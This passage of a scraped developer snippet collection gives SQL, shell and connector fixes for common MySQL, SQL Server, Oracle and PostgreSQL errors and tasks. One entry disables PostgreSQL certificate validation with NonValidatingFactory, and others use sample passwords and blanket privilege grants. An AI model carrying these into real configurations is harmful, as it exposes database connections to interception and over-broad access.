[
  {
    "id": 1,
    "keyword": null,
    "link": "                        ",
    "title": " \"i am a dummy flag\" in MySQL                        ",
    "description": "\"i_am_a_dummy flag\" in mysql engine refuses to execute any UPDATE or DELETE Statement, if WHERE clause is not present in statement. Hence it will save user to DELETE or UPDATE table data without WHERE clause. We can achieve similar functionality with 'safe_updates' option in MySQL.\r\n\r\n                    ",
    "reg_date": "2021-11-01T15:02:04.000Z"
  },
  {
    "id": 2,
    "keyword": null,
    "link": null,
    "title": " \"script output\" in sql developer",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:53:33.000Z"
  },
  {
    "id": 3,
    "keyword": null,
    "link": null,
    "title": " #1142 - SELECT command denied to user ''@'localhost' for table 'pma table uiprefs'",
    "description": "I stumble upon this issue and I solved it just by logging out of phpMyAdmin and in again.  -logout button image https://i.stack.imgur.com/TeSCb.png  EXPLANATION Take a look at the error message query: SELECT command denied to user ''@'localhost' for table 'pma_table_uiprefs' This happens due to MySQL denying access to user \"\" (blank) at server localhost. The default setting is to block all requests from anonymous users.  By logging out we force phpMyAdmin to \"forget\" the current user and let us input the login credentials for the MySQL server \n",
    "reg_date": "2021-10-12T09:53:33.000Z"
  },
  {
    "id": 4,
    "keyword": null,
    "link": null,
    "title": " $query = mysqli query($con, $sql); while ($row = mysqli fetch array($query))",
    "description": "session_start(); require_once \"connect_to_mysql.php\"; // where i store username and password to access    my db.  $sqlCommand = \"SELECT * property FROM portal\"; // dbname: portal - table: propery $query = mysqli_query($myConnection, $sqlCommand);  $Displayproperty = ''; while ($row = mysqli_fetch_array($query)) $id = $row[\"pid\"]; $title = $row[\"ptitle\"]; $area = $row[\"parea\"]; $city = $row[\"pcity\"]; $Displayproperty .= '<table width=\"500\" border=\"0\" cellspacing=\"0\" cellpadding=\"1\"> <tr> <td>' . $id . '</td> <td>' . $title . '</td> <td>' . $area . '</td> <td>' . $city . '</td> <td><a href=\"forms.php?pid=' . $id . '\">Upload images</a><br /></td> </tr> </table>'; \n",
    "reg_date": "2021-10-12T09:53:33.000Z"
  },
  {
    "id": 5,
    "keyword": null,
    "link": null,
    "title": " '0000-00-00' for column '",
    "description": "SET SQL_MODE='ALLOW_INVALID_DATES';\n",
    "reg_date": "2021-10-12T09:53:33.000Z"
  },
  {
    "id": 6,
    "keyword": null,
    "link": null,
    "title": " 'Client does not support authentication protocol requested by server; consider upgrading MySQL client', sqlState: '08004',",
    "description": "$ mysql -u root -p Enter password: (enter your root password)  mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'your_new_password'; mysql> FLUSH PRIVILEGES; mysql> quit\n",
    "reg_date": "2021-10-12T09:53:33.000Z"
  },
  {
    "id": 7,
    "keyword": null,
    "link": null,
    "title": " 'Column count doesn't match value count at row 1",
    "description": "-- The error means that you are providing not as much data as the table wp_posts does contain  -- columns. And now the DB engine does not know in which columns to put your data. -- To overcome this you must provide the names of the columns you want to fill. Example:  insert into wp_posts (column_name1, column_name2) values (1, 3)\n",
    "reg_date": "2021-10-12T09:53:33.000Z"
  },
  {
    "id": 8,
    "keyword": null,
    "link": null,
    "title": " @sqlresultsetmapping",
    "description": "@NamedNativeQuery(name = \"Schedules\",   query = \"SELECT * FROM schedule_days WHERE employeeId = 8\",   resultSetMapping = \"ScheduleResult\")\n@SqlResultSetMapping(     name=\"ScheduleResult\",     classes={       @ConstructorResult(         targetClass=com.baeldung.sqlresultsetmapping.ScheduledDay.class,         columns={           @ColumnResult(name=\"id\", type=Long.class),           @ColumnResult(name=\"employeeId\", type=Long.class),           @ColumnResult(name=\"dayOfWeek\")})})\n",
    "reg_date": "2021-10-12T09:53:33.000Z"
  },
  {
    "id": 9,
    "keyword": null,
    "link": null,
    "title": " [Error: SQLITE ERROR: table places has no column named name] { errno: 1, code: 'SQLITE ERROR' }",
    "description": "Just delete database.db and run the command again\n",
    "reg_date": "2021-10-12T09:53:33.000Z"
  },
  {
    "id": 10,
    "keyword": null,
    "link": null,
    "title": " .... ERROR! The server quit without updating PID file mysql centos",
    "description": "sudo chown -R _mysql:_mysql /usr/local/var/mysql\nsudo chown -R mysql:mysql /var/lib/mysql\n",
    "reg_date": "2021-10-12T09:53:33.000Z"
  },
  {
    "id": 11,
    "keyword": null,
    "link": null,
    "title": " . ERROR! The server quit without updating PID file (/usr/local/var/mysql/MacBook-Pro-de-Quentin.local.pid).",
    "description": "sudo chown -R _mysql:_mysql /usr/local/var/mysql\n",
    "reg_date": "2021-10-12T09:53:34.000Z"
  },
  {
    "id": 12,
    "keyword": null,
    "link": null,
    "title": " 1396(hy00) mysql error",
    "description": "drop user someuser; flush privileges;\ngrant all privileges on *.* to 'someuser'@'localhost' with grant option;\ncreate user 'someuser'@'localhost' identified by 'somepassword'; ERROR 1396 (HY000): Operation CREATE USER failed for 'someuser'@'localhost'\n",
    "reg_date": "2021-10-12T09:53:34.000Z"
  },
  {
    "id": 13,
    "keyword": null,
    "link": null,
    "title": " 1 column values in to 1 single row in sql",
    "description": "DECLARE @combinedString VARCHAR(MAX) SELECT @combinedString = COALESCE(@combinedString + ', ', '') + column_name FROM table_name WHERE ID = 1234  SELECT @combinedString as StringValue\n",
    "reg_date": "2021-10-12T09:53:34.000Z"
  },
  {
    "id": 14,
    "keyword": null,
    "link": null,
    "title": " 2.\tDesign a query that displays the SSN, Last Name, First Name and the department name of female employees",
    "description": "2.\tDesign a query that displays the SSN, Last Name, First Name and the department name of female employees \n",
    "reg_date": "2021-10-12T09:53:34.000Z"
  },
  {
    "id": 15,
    "keyword": null,
    "link": null,
    "title": " 2nd highest salary in mysql",
    "description": "#2nd Most highest salary using Limit & Order By SELECT Salary FROM (SELECT Salary FROM Employee ORDER BY salary DESC LIMIT 2) AS Emp ORDER BY salary LIMIT 1;\n#2nd Most highest salary using dense_rank() SELECT sal  FROM (SELECT dense_rank() over(ORDER BY sal DESC) AS R, sal FROM emp) employee  WHERE R = 2;\n#Corelated Subquery SELECT Id, Salary FROM Employee e WHERE 2=(SELECT COUNT(DISTINCT Salary) FROM Employee p WHERE e.Salary<=p.Salary)\n",
    "reg_date": "2021-10-12T09:53:34.000Z"
  },
  {
    "id": 16,
    "keyword": null,
    "link": null,
    "title": " 3 days back in sql server",
    "description": "DATEADD(HOUR, 2, GETUTCDATE())\nDATEADD(DAY, -3, GETDATE())\nSELECT GETDATE() - 1\n",
    "reg_date": "2021-10-12T09:53:34.000Z"
  },
  {
    "id": 17,
    "keyword": null,
    "link": null,
    "title": " 3rd highest salary in sql",
    "description": "SELECT TOP 1 salary FROM ( SELECT DISTINCT TOP N salary FROM #Employee ORDER BY salary DESC ) AS temp ORDER BY salary\nHere is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \nSELECT MAX(SALARY) 'SECOND_MAX' FROM EMPLOYEES WHERE SALARY <> (SELECT MAX(SALARY) FROM EMPLOYEES);   OR  Here is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \nHere is the solution for 3rd highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = 3; \nSELECT ename,sal from Employee e1 where          N-1 = (SELECT COUNT(DISTINCT sal)from Employee e2 where e2.sal > e1.sal)      \nSELECT salary FROM Employee ORDER BY salary DESC LIMIT N-1, 1\n",
    "reg_date": "2021-10-12T09:53:34.000Z"
  },
  {
    "id": 18,
    "keyword": null,
    "link": null,
    "title": " ADD COLOUNS CREATED AND UPDATED AT IN MYSQL",
    "description": "ALTER TABLE t1 ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, ADD COLUMN updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP;\n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 19,
    "keyword": null,
    "link": null,
    "title": " ALL TAB PARTITIONS",
    "description": "SELECT * FROM ALL_TAB_PARTITIONS;\n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 20,
    "keyword": null,
    "link": null,
    "title": " AND OR NOT operators sql",
    "description": "-----------------------SQL AND, OR, NOT OPERATORS------------------------------ AND: this operator displays a record if all conditions seperated by AND are true. OR: this operator displays a record if any of the conditions seperated by OR is true. NOT: this operator displays a record if the conditions is Not true.\n(NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC'; \n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 21,
    "keyword": null,
    "link": null,
    "title": " Access to DialectResolutionInfo cannot be null when 'hibernate.dialect' not set",
    "description": "spring.jpa.database=mysql \n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 22,
    "keyword": null,
    "link": null,
    "title": " Add 2 hours to current time in MySQL",
    "description": "SELECT *  FROM courses  WHERE DATE_ADD(NOW(), INTERVAL 2 HOUR) > start_time\n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 23,
    "keyword": null,
    "link": null,
    "title": " Add SuperUser MySQL",
    "description": "CREATE USER 'pmauser'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password_here';\n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 24,
    "keyword": null,
    "link": null,
    "title": " Add a new column into table",
    "description": "ALTER TABLE table ADD [COLUMN] column_name;\n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 25,
    "keyword": null,
    "link": null,
    "title": " Add colum sqlite table",
    "description": "ALTER TABLE table_name ADD COLUMN new_column_name column_type\nALTER TABLE employees   ADD status VARCHAR;\n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 26,
    "keyword": null,
    "link": null,
    "title": " Add column in table",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name varchar(50);\nALTER TABLE table_name ADD column_name datatype;\nALTER TABLE table ADD COLUMN column VARCHAR (255) NOT NULL AFTER column;\nALTER TABLE table_name   ADD column_name column_definition;\n                                                     ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 27,
    "keyword": null,
    "link": null,
    "title": " Add column in tableAdd multiple columns in table",
    "description": "ALTER TABLE table_name   ADD column_1 column_definition,       column_2 column_definition,       ...       column_n column_definition;\n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 28,
    "keyword": null,
    "link": null,
    "title": " An error occurred while installing mysql2 (0.5.3)",
    "description": "$ bundle config --local build.mysql2 \"--with-ldflags=-L/usr/local/opt/openssl/lib --with-cppflags=-I/usr/local/opt/openssl/include\"\n",
    "reg_date": "2021-10-12T09:53:35.000Z"
  },
  {
    "id": 29,
    "keyword": null,
    "link": null,
    "title": " An error occurred while installing pg (1.2.3), and Bundler cannot continue. Make sure that `gem install pg -v '1.2.3' --source 'https://rubygems.org/'` succeeds before bundling.",
    "description": "sudo apt-get install libpq-dev \n",
    "reg_date": "2021-10-12T09:53:36.000Z"
  },
  {
    "id": 30,
    "keyword": null,
    "link": null,
    "title": " Aqua Data studio postgresql ssl",
    "description": "Aqua Data studio postgresql ssl  In your Server Registration dialog, in the Driver tab you can enter the  parameter value of:  ?ssl=true;sslfactory=org.postgresql.ssl.NonValidatingFactory  This will tell the driver to enable SSL and to use the NonValidatingFactory.   The documentation for the NonValidatingFactory is : \"Provide a SSLSocketFactory that allows SSL connections to be made without validating the server's certificate. This is more convenient for some applications, but is less secure as it allows \"man in the middle\" attacks.\"  Do note that the \"ssl\" and the \"sslfactory\" options are separated by \";\" and not \"&\".\n",
    "reg_date": "2021-10-12T09:53:36.000Z"
  },
  {
    "id": 31,
    "keyword": null,
    "link": null,
    "title": " Assign value to var in SQL",
    "description": "DECLARE @EmpIDVariable int; SELECT @EmpIDVariable = MAX(EmployeeID) FROM HumanResources.Employee;\n",
    "reg_date": "2021-10-12T09:53:36.000Z"
  },
  {
    "id": 32,
    "keyword": null,
    "link": null,
    "title": " BigQuery Remove Duplicate Keys From Table",
    "description": "#standardSQL CREATE OR REPLACE TABLE `myproject.datasetID.tableID` AS SELECT * FROM (   SELECT AS VALUE ANY_VALUE(new_table)   FROM `myproject.dev.sample` AS new_table   GROUP BY key1 #,key2 ) \n",
    "reg_date": "2021-10-12T09:53:36.000Z"
  },
  {
    "id": 33,
    "keyword": null,
    "link": null,
    "title": " C# mysql data reader from two tables",
    "description": "using (SqlConnection connection = new SqlConnection(\"connection string here\")) {     using (SqlCommand command = new SqlCommand            (\"SELECT Column1 FROM Table1; SELECT Column2 FROM Table2\", connection))     {         connection.Open();          using (SqlDataReader reader = command.ExecuteReader())         {             while (reader.Read())             {                 MessageBox.Show(reader.GetString(0), \"Table1.Column1\");             }              if(reader.NextResult())             {                while (reader.Read())               {                 MessageBox.Show(reader.GetString(0), \"Table2.Column2\");               }             }         }     } }\n",
    "reg_date": "2021-10-12T09:53:36.000Z"
  },
  {
    "id": 34,
    "keyword": null,
    "link": null,
    "title": " CREATE DATABASE DatabaseName;",
    "description": "CREATE DATABASE databasename;\nSHOW DATABASES;  DROP DATABASE testDB;  USE DatabaseName;    SQL> CREATE TABLE CUSTOMERS(    ID   INT              NOT NULL,    NAME VARCHAR (20)     NOT NULL,    AGE  INT              NOT NULL,    ADDRESS  CHAR (25) ,    SALARY   DECIMAL (18, 2),           PRIMARY KEY (ID) );  DESC CUSTOMERS;\n",
    "reg_date": "2021-10-12T09:53:36.000Z"
  },
  {
    "id": 35,
    "keyword": null,
    "link": null,
    "title": " CREATE DATABASE db; SyntaxError: Unexpected identifier",
    "description": "Mysql JS>  \\sql Mysql SQL>  \\connect root@localhost\n",
    "reg_date": "2021-10-12T09:53:36.000Z"
  },
  {
    "id": 36,
    "keyword": null,
    "link": null,
    "title": " CREATE trigger SQL",
    "description": "-- SQL Server (update my_table after update on my_table) CREATE TRIGGER trigger_name ON my_table AFTER UPDATE AS IF UPDATE (col_name)\t-- Optional, for particular column BEGIN     UPDATE my_table SET my_col_date = getdate() FROM my_table  END; -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER UPDATE ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\nCREATE TRIGGER Product_Details_tr  BEFORE INSERT ON Product_Details  FOR EACH ROW  SET NEW.User_ID = CURRENT_USER();\n-- Oracle DB Syntax CREATE OR REPLACE TRIGGER {trigger_name}  BEFORE | AFTER  INSERT | UPDATE | DELETE  ON {table_name} (FOR EACH ROW)  {operation to be executed}  -- for example CREATE TRIGGER log_updates  AFTER INSERT OR UPDATE ON Person FOR EACH ROW  INSERT INTO LogPerson(ts, IdPerson, surname) VALUES(CURRENT_TIMESTAMP, NEW.id, NEW.surname);\nCREATE TRIGGER trigger_name    ON { Table name or view name }    [ WITH <Options> ]   { FOR | AFTER | INSTEAD OF }    { [INSERT], [UPDATE] , [DELETE] }\t\t\t\nCREATE TRIGGER schema_name.trigger_name ON table_name AFTER  INSERT,UPDATE,DELETE AS {sql_statements} \n-- SQL Server Syntax   -- Trigger on an INSERT, UPDATE, or DELETE statement to a table or view (DML Trigger)      CREATE [ OR ALTER ] TRIGGER [ schema_name . ]trigger_name    ON { table | view }    [ WITH <dml_trigger_option> [ ,...n ] ]   { FOR | AFTER | INSTEAD OF }    { [ INSERT ] [ , ] [ UPDATE ] [ , ] [ DELETE ] }    [ WITH APPEND ]   [ NOT FOR REPLICATION ]    AS { sql_statement  [ ; ] [ ,...n ] | EXTERNAL NAME <method specifier [ ; ] > }      <dml_trigger_option> ::=       [ ENCRYPTION ]       [ EXECUTE AS Clause ]      <method_specifier> ::=       assembly_name.class_name.method_name      \n",
    "reg_date": "2021-10-12T09:53:36.000Z"
  },
  {
    "id": 37,
    "keyword": null,
    "link": null,
    "title": " CRETE DATABASE AND ADD USER",
    "description": "GRANT ALL PRIVILEGES ON DATABASE guru99 TO mytest;\n",
    "reg_date": "2021-10-12T09:53:36.000Z"
  },
  {
    "id": 38,
    "keyword": null,
    "link": null,
    "title": " CTE statement sql server",
    "description": "WITH Employee_CTE (EmployeeNumber, Title) AS (SELECT NationalIDNumber,         JobTitle  FROM   HumanResources.Employee) SELECT EmployeeNumber,        Title FROM   Employee_CTE\n",
    "reg_date": "2021-10-12T09:53:36.000Z"
  },
  {
    "id": 39,
    "keyword": null,
    "link": null,
    "title": " Call to undefined function mysql connect()",
    "description": "Try checking to see if the PHP MySQL extension module is being loaded:  <?php     phpinfo(); ?>  If it's not there, add the following to the php.ini file:  extension=php_mysql.dll  Save and Restart You Apache HTTP Server\nsudo apt install php-mysqli\nIn case, you are using PHP7 already, the formerly deprecated functions mysql_* were removed entirely, so you should update your code using the PDO-functions or mysqli_* functions instead.  If that's not possible, as a workaround, rubo77 created a small PHP include file, that recreates the old mysql_* functions with mysqli_*()-functions: https://github.com/rubo77/php-mysql-fix\n",
    "reg_date": "2021-10-12T09:53:37.000Z"
  },
  {
    "id": 40,
    "keyword": null,
    "link": null,
    "title": " Call to undefined function mysqli init()",
    "description": "it is not a bug in your application, it is just a missing driver, so, you have couple of options...  Go to your php init and uncomment the following:  extension=php_mysqli.dll If not, try installing it at your server, it varies depending on your  distribution.  Try installing php5-mysqlnd  If you cannot do it by hosting restrictions then just move to mysql driver  (wont need to change other configurations or queries in CodeIgniter or anything  else...)  like this (at your config file)  $db['default']['dbdriver'] = 'mysql'; (you might have mysqli now)\n",
    "reg_date": "2021-10-12T09:53:37.000Z"
  },
  {
    "id": 41,
    "keyword": null,
    "link": null,
    "title": " Can't connect to local MySQL server through socket '/tmp/mysql.sock'",
    "description": "sudo chown -R _mysql:mysql /usr/local/var/mysql  sudo mysql.server start\n# Start your mysql server /etc/init.d/mysql start\nTry to start the MySQL server: mysql.server start\n# this saved my ass # first  you must perform a graceful shutdown of the server from the command line rather than powering off the server shutdown -h now  # an additional method for getting it back up again when you run into this problem is to move mysql.sock  # to centos mv /var/lib/mysql/mysql.sock /var/lib/mysql/mysql.sock.bak  # to ubuntu mv /var/run/mysqld/mysqld.sock /var/run/mysqld/mysqld.sock.bak  # restart mysql service mysqld start\nln -s /private/var/mysql/mysql.sock /tmp/mysql.sock \nsudo /usr/local/mysql/support-files/mysql.server start  \n",
    "reg_date": "2021-10-12T09:53:37.000Z"
  },
  {
    "id": 42,
    "keyword": null,
    "link": null,
    "title": " Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)",
    "description": "# Start your mysql server /etc/init.d/mysql start\nservice mysql start \n# this saved my ass # first  you must perform a graceful shutdown of the server from the command line rather than powering off the server shutdown -h now  # an additional method for getting it back up again when you run into this problem is to move mysql.sock  # to centos mv /var/lib/mysql/mysql.sock /var/lib/mysql/mysql.sock.bak  # to ubuntu mv /var/run/mysqld/mysqld.sock /var/run/mysqld/mysqld.sock.bak  # restart mysql service mysqld start\nsudo apt-get install mysql-server \n#/usr/sbin/mysqld --defaults-file=/etc/mysql/my.cnf --basedir=/usr --datadir=/var/lib/mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock \n",
    "reg_date": "2021-10-12T09:53:37.000Z"
  },
  {
    "id": 43,
    "keyword": null,
    "link": null,
    "title": " Cannot define PRIMARY KEY constraint on nullable column in table 'Student'.",
    "description": "ALTER TABLE tbl_name alter column column_name int NOT NULL \n",
    "reg_date": "2021-10-12T09:53:37.000Z"
  },
  {
    "id": 44,
    "keyword": null,
    "link": null,
    "title": " Cannot insert explicit value for identity column in table 'Tbl Increment File' when IDENTITY INSERT is set to OFF.",
    "description": "SET IDENTITY_INSERT MyTable ON   -- INSERT INTO MyTable...   SET IDENTITY_INSERT MyTable OFF \n",
    "reg_date": "2021-10-12T09:53:37.000Z"
  },
  {
    "id": 45,
    "keyword": null,
    "link": null,
    "title": " Cannot load driver class: com.mysql.cj.jdbc.Driver",
    "description": "<dependency>     <groupId>mysql</groupId>     <artifactId>mysql-connector-java</artifactId>     <version>8.0.18</version> </dependency>\n",
    "reg_date": "2021-10-12T09:53:37.000Z"
  },
  {
    "id": 46,
    "keyword": null,
    "link": null,
    "title": " Case in sql",
    "description": "-- NOTE: this is for SQL-Oracle specifically  /* NB: Please like Mingles444 post, I derived this from him/her */  -- syntax: (Retrieved from grepper:Mingles444) CASE     WHEN condition1 THEN result1     WHEN condition2 THEN result2     WHEN conditionN THEN resultN     ELSE result END   -- example: SELECT  \tCASE       WHEN (1+6 = 6) THEN 'A'       WHEN (1+6 = 7) THEN 'B'       WHEN (1+6 = 8) THEN 'C'       ELSE 'D' \tEND  FROM DUAL;  -- OUTPUT: B \n-- Case Eg.) to retrive the MAX value of a Field  -- if there are entries for the Field in table MAX value will be returned  -- But if there is no entries at all for the Field in tabel MAX will return -- Null as the output. But Using Case When we can check it out return zero  -- or any other value if there is no enties for the Field in table.. SELECT  CASE   -- Like Switch Case \tWHEN -- First When condition  \t\t(MAX(BILLID) IS NULL) -- Condition  \tTHEN 1   -- output   (We can also add more When conditions like Above) ELSE -- When WHEN Condition not Satisfied Below will be Executed.  \t\t(MAX(BILLID)) -- output END  as MAXBILLID   from  DUAL; -- Final Output -- If there is no entry in the Field for the table -- BILLID --  1 -- If there are entries MAX of that Field value from the table -- BILLID -- 10\n/*CASE statements are used to create different outputs and is    used by SQL as a way to handle if-then logic.*/      SELECT column_name,     CASE        WHEN condition THEN 'Result_1'       WHEN condition THEN 'Result_2'       ELSE 'Result_3'     END   FROM table_name;\nselect  case when ID in ('1', '2', '3') then 'Jack' else 'Jim' end as Person from Table.Names  select case when ID in ('1', '2', '3') then 'Jack' else 'Jim' end Person from Table.Names\nChange query output depending on conditions. Example: Returns users and their subscriptions, along with a new column called activity_levels that makes a judgement based on the number of subscriptions. SELECT first_name, surname, subscriptions CASE WHEN subscriptions > 10 THEN 'Very active' WHEN Quantity BETWEEN 3 AND 10 THEN 'Active' ELSE 'Inactive' END AS activity_levels FROM users;\n   SELECT OrderID, Quantity, CASE     WHEN Quantity > 30    THEN 'The quantity is greater than 30'     WHEN Quantity = 30 THEN 'The    quantity is 30'     ELSE 'The quantity is under 30' END AS QuantityText FROM OrderDetails; \n",
    "reg_date": "2021-10-12T09:53:37.000Z"
  },
  {
    "id": 47,
    "keyword": null,
    "link": null,
    "title": " Cast for print sql",
    "description": "declare @x INT = 1   PRINT 'There are ' + CAST(@x AS VARCHAR) + ' alias combinations did not match a record'\n",
    "reg_date": "2021-10-12T09:53:37.000Z"
  },
  {
    "id": 48,
    "keyword": null,
    "link": null,
    "title": " Caused by: java.lang.IllegalStateException: Cannot load driver class: com.mysql.jdbc.Driver",
    "description": "<dependency>     <groupId>mysql</groupId>     <artifactId>mysql-connector-java</artifactId>     <version>8.0.18</version> </dependency>\n",
    "reg_date": "2021-10-12T09:53:38.000Z"
  },
  {
    "id": 49,
    "keyword": null,
    "link": null,
    "title": " Change column data type sql",
    "description": "ALTER TABLE table_name ALTER COLUMN column_name datatype;  -- Example ALTER TABLE product ALTER COLUMN description VARCHAR(250);\nALTER TABLE table_name  ALTER COLUMN column_name new_data_type(size); \nALTER TABLE TableName  ALTER COLUMN ColumnName NVARCHAR(200) [NULL | NOT NULL] \n",
    "reg_date": "2021-10-12T09:53:38.000Z"
  },
  {
    "id": 50,
    "keyword": null,
    "link": null,
    "title": " Check database restore status sql script",
    "description": "SELECT r.session_id,r.command,CONVERT(NUMERIC(6,2),r.percent_complete) AS [Percent Complete],CONVERT(VARCHAR(20),DATEADD(ms,r.estimated_completion_time,GetDate()),20) AS [ETA Completion Time], CONVERT(NUMERIC(10,2),r.total_elapsed_time/1000.0/60.0) AS [Elapsed Min], CONVERT(NUMERIC(10,2),r.estimated_completion_time/1000.0/60.0) AS [ETA Min], CONVERT(NUMERIC(10,2),r.estimated_completion_time/1000.0/60.0/60.0) AS [ETA Hours], CONVERT(VARCHAR(1000),(SELECT SUBSTRING(text,r.statement_start_offset/2, CASE WHEN r.statement_end_offset = -1 THEN 1000 ELSE (r.statement_end_offset-r.statement_start_offset)/2 END) FROM sys.dm_exec_sql_text(sql_handle))) AS [SQL] FROM sys.dm_exec_requests r WHERE command IN ('RESTORE DATABASE','BACKUP DATABASE') \n",
    "reg_date": "2021-10-12T09:53:38.000Z"
  },
  {
    "id": 51,
    "keyword": null,
    "link": null,
    "title": " CockroachDB create user",
    "description": "#Create User CREATE USER <CREATEDUSER> WITH PASSWORD '<PASSWORD>';  #Grants Permission for database or table GRANT SELECT, INSERT, UPDATE, DELETE ON DATABASE <DATABASENAME> TO <CREATEDUSER>;  #Revoke access from database or table REVOKE SELECT ON DATABASE <DATABASENAME> FROM <USER_OR_ROLE>;\n",
    "reg_date": "2021-10-12T09:53:38.000Z"
  },
  {
    "id": 52,
    "keyword": null,
    "link": null,
    "title": " Columns Present in a table",
    "description": "DESCRIBE Table_Name;  OR   DESC Table_Name;\n",
    "reg_date": "2021-10-12T09:53:38.000Z"
  },
  {
    "id": 53,
    "keyword": null,
    "link": null,
    "title": " Concatenate columns in table",
    "description": "/*  Takes several columns to form a single name  */ select concat(prefix,' ',first,' ',last,' ',suffix) as title from names\n",
    "reg_date": "2021-10-12T09:53:38.000Z"
  },
  {
    "id": 54,
    "keyword": null,
    "link": null,
    "title": " Connecting to MySQL Using Connector/Python",
    "description": "pip3 install mysql-connector-python  #Python 3 pip install mysql-connector-python \n# real nice guide, as well as instalation guide: https://pynative.com/python-mysql-database-connection/ # pip install mysql-connector-python import mysql.connector from mysql.connector import Error  try:     connection = mysql.connector.connect(host='localhost',                                          database='Electronics',                                          user='pynative',                                          password='pynative@#29')     if connection.is_connected():         db_Info = connection.get_server_info()         print(\"Connected to MySQL Server version \", db_Info)         cursor = connection.cursor()         cursor.execute(\"select database();\")         record = cursor.fetchone()         print(\"You're connected to database: \", record)  except Error as e:     print(\"Error while connecting to MySQL\", e) finally:     if (connection.is_connected()):         cursor.close()         connection.close()         print(\"MySQL connection is closed\")\nimport mysql.connector  cnx = mysql.connector.connect(user='scott', password='password',                               host='127.0.0.1',                               database='employees') cnx.close()\nimport mysql.connector  mydb = mysql.connector.connect(   host=\"localhost\",   user=\"yourusername\",   password=\"yourpassword\" )  print(mydb)\nPress CTRL+C to copy import datetime import mysql.connector  cnx = mysql.connector.connect(user='scott', database='employees') cursor = cnx.cursor()  query = (\"SELECT first_name, last_name, hire_date FROM employees \"          \"WHERE hire_date BETWEEN %s AND %s\")  hire_start = datetime.date(1999, 1, 1) hire_end = datetime.date(1999, 12, 31)  cursor.execute(query, (hire_start, hire_end))  for (first_name, last_name, hire_date) in cursor:   print(\"{}, {} was hired on {:%d %b %Y}\".format(     last_name, first_name, hire_date))  cursor.close() cnx.close()\nimport mysql.connector try:     connection = mysql.connector.connect(host='localhost',database='dbname',user='root',password='xxxxx')     # print(dir(connection))     # print(connection.connection_id)     if connection.is_connected():         db_Info = connection.get_server_info()         print(\"Connected to MySQL Server version \", db_Info)         cursor = connection.cursor()         cursor.execute(\"select database();\")         record = cursor.fetchone()         print(\"You're connected to database: \", record) except Error as e:     print(\"except\")     print(\"Error while connecting to MySQL\", e) finally:     if (connection.is_connected()):         cursor.close()         connection.close()         print(\"MySQL connection is closed\")\n",
    "reg_date": "2021-10-12T09:53:38.000Z"
  },
  {
    "id": 55,
    "keyword": null,
    "link": null,
    "title": " Converting mysql tables to charset utf8mb4",
    "description": "--For each database:  ALTER DATABASE     database_name     CHARACTER SET = utf8mb4     COLLATE = utf8mb4_unicode_ci;      --For each table:  ALTER TABLE     table_name     CONVERT TO CHARACTER SET utf8mb4     COLLATE utf8mb4_unicode_ci;      --For each column:  ALTER TABLE     table_name     CHANGE column_name column_name     VARCHAR(191)     CHARACTER SET utf8mb4     COLLATE utf8mb4_unicode_ci;\nALTER TABLE     table_name     CONVERT TO CHARACTER SET utf8mb4     COLLATE utf8mb4_unicode_ci;\nALTER TABLE     table_name     CHANGE column_name column_name     VARCHAR(191)     CHARACTER SET utf8mb4     COLLATE utf8mb4_unicode_ci;\nALTER DATABASE     database_name     CHARACTER SET = utf8mb4     COLLATE = utf8mb4_unicode_ci;\n",
    "reg_date": "2021-10-12T09:53:38.000Z"
  },
  {
    "id": 56,
    "keyword": null,
    "link": null,
    "title": " Create View",
    "description": "CREATE VIEW view_name AS SELECT column1, column2, ... FROM table_name WHERE condition;\nCREATE VIEW vw_Names      AS      SELECT ProductName, Price FROM Products;   GO     \nCREATE VIEW view_name AS SELECT id,category,MAX(created_at),content,title FROM table WHERE condition GROUP BY category\nCREATE VIEW sales.daily_sales AS SELECT     year(order_date) AS y,     month(order_date) AS m,     day(order_date) AS d,     p.product_id,     product_name,     quantity * i.list_price AS sales FROM     sales.orders AS o INNER JOIN sales.order_items AS i     ON o.order_id = i.order_id INNER JOIN production.products AS p     ON p.product_id = i.product_id; Code language: SQL (Structured Query Language) (sql)\n",
